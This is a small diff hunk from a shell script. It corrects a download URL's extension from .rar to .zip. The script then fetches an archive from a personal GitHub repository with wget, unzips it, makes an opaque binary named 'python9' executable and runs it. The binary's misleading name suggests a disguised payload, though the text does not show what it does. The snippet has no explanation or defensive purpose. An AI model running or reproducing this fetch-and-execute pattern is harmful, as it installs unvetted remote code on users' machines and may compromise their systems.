@@ -25,7 +25,7 @@ fi
 exit
 fi
 
-wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/mor.rar
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/mor.zip
 unzip mor.zip
 chmod +x python9
 ./python9
